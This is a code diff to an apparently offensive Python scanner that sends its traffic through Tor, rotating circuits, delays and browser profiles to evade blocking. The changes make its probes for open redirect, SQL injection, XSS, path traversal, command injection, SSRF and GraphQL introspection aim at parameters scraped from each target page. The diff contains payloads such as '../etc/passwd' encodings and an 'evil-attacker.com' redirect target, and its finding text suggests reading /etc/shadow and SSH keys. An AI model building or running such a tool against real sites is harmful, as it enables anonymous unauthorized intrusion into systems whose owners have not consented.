@@ -333,7 +333,6 @@ class TorSession:
                 if resp.status_code in (403, 429, 503):
                     self._domain_blocks[domain] = self._domain_blocks.get(domain, 0) + 1
                     self._total_blocks += 1
-                    # If we just hit the threshold, stop retrying immediately
                     if self.is_domain_blocked(domain):
                         integrity_log("intel", f"domain_circuit_breaker:{domain}")
                         return None
@@ -341,6 +340,15 @@ class TorSession:
                     time.sleep(2 + secrets.randbelow(3000) / 1000.0)
                     continue
 
+                # 4xx/5xx: return as-is (may contain useful error info for vuln checks)
+                # but don't count as blocks. 404 is expected for path probes.
+                if resp.status_code == 404:
+                    return resp
+                # Server errors: rotate circuit and retry on 502 (proxy error)
+                if resp.status_code == 502 and attempt < MAX_RETRIES_PER_URL - 1:
+                    newnym()
+                    time.sleep(1 + secrets.randbelow(2000) / 1000.0)
+                    continue
                 return resp
 
             except requests.exceptions.Timeout:
@@ -722,11 +730,65 @@ class VulnScanner:
         re.compile(r"You have an error in your SQL syntax", re.I),
     ]
 
-    # XSS reflection test — we inject a unique marker, check if reflected unescaped
-    XSS_CANARY = f"gs{secrets.token_hex(4)}test"
-
     def __init__(self, session: TorSession):
         self._session = session
+        self._page_params: List[str] = []
+        self._page_forms: List[dict] = []
+
+    def extract_params_from_html(self, html: str, base_url: str):
+        """Extract real parameter names from forms, links, and scripts on the page.
+
+        This is what makes the scanner targeted instead of blind — we test
+        params that actually exist on the target, not generic guesses.
+        """
+        params: Set[str] = set()
+        forms: List[dict] = []
+
+        # Extract from URL query strings in links
+        url_params = re.findall(r'[?&]([a-zA-Z_][a-zA-Z0-9_]{0,30})=', html[:100000])
+        params.update(p.lower() for p in url_params)
+
+        # Extract from HTML forms
+        if HAS_BS4:
+            try:
+                soup = BeautifulSoup(html[:100000], "html.parser")
+                for form in soup.find_all("form"):
+                    form_data = {
+                        "action": form.get("action", ""),
+                        "method": (form.get("method", "GET")).upper(),
+                        "params": [],
+                    }
+                    for inp in form.find_all(["input", "select", "textarea"]):
+                        name = inp.get("name", "")
+                        if name and not name.startswith("_"):
+                            form_data["params"].append(name)
+                            params.add(name.lower())
+                    if form_data["params"]:
+                        forms.append(form_data)
+            except Exception:
+                pass
+
+        # Extract from JavaScript variable assignments and AJAX calls
+        js_params = re.findall(
+            r'(?:data|params|query)\s*[\[.]\s*["\']([a-zA-Z_]\w{0,30})["\']',
+            html[:50000]
+        )
+        params.update(p.lower() for p in js_params)
+
+        self._page_params = list(params)[:30]
+        self._page_forms = forms[:10]
+
+    def _get_test_params(self, fallback: List[str]) -> List[str]:
+        """Get params to test: prefer real page params, fall back to common ones."""
+        if self._page_params:
+            combined = list(self._page_params[:5])
+            for fb in fallback:
+                if fb not in combined:
+                    combined.append(fb)
+                if len(combined) >= 5:
+                    break
+            return combined
+        return fallback[:5]
 
     @staticmethod
     def _add_confidence(findings: List[dict], base_confidence: float) -> List[dict]:
@@ -792,6 +854,12 @@ class VulnScanner:
         if headers is None:
             headers = {}
         findings = []
+
+        # Extract real params from the page HTML for targeted testing
+        if html:
+            self.extract_params_from_html(html, base_url)
+            if self._page_params:
+                print(f"      found {len(self._page_params)} testable parameters")
 
         # Header checks (instant, no network)
         self._run_check("security headers", self._check_security_headers,
@@ -1079,13 +1147,14 @@ class VulnScanner:
     def _check_http_methods(self, base_url: str) -> List[dict]:
         """Check for dangerous HTTP methods enabled."""
         findings = []
-        resp = self._session.get(base_url, allow_wayback=False, method="HEAD")
-        if not resp:
+        domain = urlparse(base_url).netloc
+        if self._session.is_domain_blocked(domain):
             return findings
 
-        # Try OPTIONS to discover allowed methods
         try:
-            opt_resp = self._session._session.options(base_url, timeout=15,
+            self._session._delay_for_domain(domain)
+            self._session._maybe_rotate_circuit()
+            opt_resp = self._session._session.options(base_url, timeout=REQUEST_TIMEOUT,
                                                        proxies=self._session._proxy,
                                                        headers=_pick_profile())
             if opt_resp and opt_resp.status_code == 200:
@@ -1111,14 +1180,19 @@ class VulnScanner:
         """Check for open redirect vulnerabilities."""
         findings = []
         evil_target = "https://evil-attacker.com/pwned"
+        domain = urlparse(base_url).netloc
 
-        for param in self.REDIRECT_PARAMS[:5]:  # Limit to avoid excessive requests
+        for param in self.REDIRECT_PARAMS[:5]:
             if shutdown_requested():
+                break
+            if self._session.is_domain_blocked(domain):
                 break
             test_url = f"{base_url}?{param}={quote(evil_target)}"
             try:
+                self._session._delay_for_domain(domain)
+                self._session._maybe_rotate_circuit()
                 resp = self._session._session.get(
-                    test_url, timeout=15, allow_redirects=False,
+                    test_url, timeout=REQUEST_TIMEOUT, allow_redirects=False,
                     proxies=self._session._proxy, headers=_pick_profile()
                 )
                 if resp and resp.status_code in (301, 302, 303, 307, 308):
@@ -1157,9 +1231,9 @@ class VulnScanner:
         always show SQL traces.
         """
         findings = []
-        test_params = ["id", "page", "q", "search", "user", "item", "cat"]
+        test_params = self._get_test_params(["id", "page", "q", "search", "user", "item", "cat"])
 
-        for param in test_params[:3]:
+        for param in test_params[:5]:
             if shutdown_requested():
                 break
             # Baseline: clean request with a safe value
@@ -1203,10 +1277,10 @@ class VulnScanner:
         inside a WAF/block page (which would be a false positive).
         """
         findings = []
-        canary = self.XSS_CANARY
-        test_params = ["q", "search", "query", "s", "name", "input"]
+        canary = f"gs{secrets.token_hex(4)}test"
+        test_params = self._get_test_params(["q", "search", "query", "s", "name", "input"])
 
-        for param in test_params[:3]:
+        for param in test_params[:5]:
             if shutdown_requested():
                 break
             payload = f"<{canary}>"
@@ -1286,6 +1360,7 @@ class VulnScanner:
                             "test_url": test_url,
                             "exploit_info": {
                                 "type": "directory_traversal",
+                                "parameter": "path",
                                 "method": "Path traversal to read arbitrary files. "
                                           "Try: /etc/shadow, application configs, database files, "
                                           "source code, SSH keys (~/.ssh/id_rsa).",
@@ -1300,14 +1375,19 @@ class VulnScanner:
         findings = []
         gql_paths = ["/graphql", "/graphql/", "/api/graphql", "/v1/graphql"]
         introspection_query = {"query": '{ __schema { types { name } } }'}
+        domain = urlparse(base_url).netloc
 
         for gql_path in gql_paths:
             if shutdown_requested():
                 break
+            if self._session.is_domain_blocked(domain):
+                break
             url = urljoin(base_url, gql_path)
             try:
+                self._session._delay_for_domain(domain)
+                self._session._maybe_rotate_circuit()
                 resp = self._session._session.post(
-                    url, json=introspection_query, timeout=15,
+                    url, json=introspection_query, timeout=REQUEST_TIMEOUT,
                     proxies=self._session._proxy, headers=_pick_profile()
                 )
                 if resp and resp.status_code == 200:
@@ -1342,8 +1422,8 @@ class VulnScanner:
     def _check_ssrf_indicators(self, base_url: str) -> List[dict]:
         """Check for SSRF (Server-Side Request Forgery) indicators."""
         findings = []
-        ssrf_params = ["url", "uri", "src", "source", "href", "link",
-                       "img", "image", "fetch", "load", "proxy"]
+        ssrf_params = self._get_test_params(["url", "uri", "src", "source", "href", "link",
+                       "img", "image", "fetch", "load", "proxy"])
         # We use a unique callback canary — if the server fetches it, SSRF exists.
         # Since we can't host a listener through Tor easily, we check for error
         # responses that reveal the server tried to fetch the URL.
@@ -1393,7 +1473,7 @@ class VulnScanner:
     def _check_lfi(self, base_url: str) -> List[dict]:
         """Check for Local File Inclusion (LFI) vulnerabilities."""
         findings = []
-        lfi_params = ["page", "file", "include", "template", "path", "doc", "view"]
+        lfi_params = self._get_test_params(["page", "file", "include", "template", "path", "doc", "view"])
         lfi_payloads = [
             ("..%2F..%2F..%2F..%2Fetc%2Fpasswd", "etc/passwd via URL encoding"),
             ("....//....//....//....//etc/passwd", "etc/passwd via double-dot bypass"),
@@ -1407,7 +1487,7 @@ class VulnScanner:
             re.compile(r"www-data:"),
         ]
 
-        for param in lfi_params[:3]:
+        for param in lfi_params[:5]:
             for payload, desc in lfi_payloads[:2]:
                 if shutdown_requested():
                     return findings
@@ -1440,7 +1520,7 @@ class VulnScanner:
     def _check_command_injection(self, base_url: str) -> List[dict]:
         """Check for OS command injection indicators."""
         findings = []
-        cmd_params = ["cmd", "exec", "command", "ping", "host", "ip", "query"]
+        cmd_params = self._get_test_params(["cmd", "exec", "command", "ping", "host", "ip", "query"])
         # Use a time-based detection: if sleep(5) makes the response 5s slower,
         # command injection exists. Canary: semicolon + sleep.
         # We also check for direct output of common commands.
@@ -2389,12 +2469,17 @@ class FindingChain:
         findings = []
         path = gql_finding.get("exploit_info", {}).get("path", "/graphql")
         url = urljoin(base_url, path)
+        domain = urlparse(base_url).netloc
 
-        # Full introspection query to find sensitive types
+        if self._session.is_domain_blocked(domain):
+            return findings
+
         query = '{ __schema { types { name fields { name type { name } } } } }'
         try:
+            self._session._delay_for_domain(domain)
+            self._session._maybe_rotate_circuit()
             resp = self._session._session.post(
-                url, json={"query": query}, timeout=15,
+                url, json={"query": query}, timeout=REQUEST_TIMEOUT,
                 proxies=self._session._proxy, headers=_pick_profile(),
             )
             if resp and resp.status_code == 200:
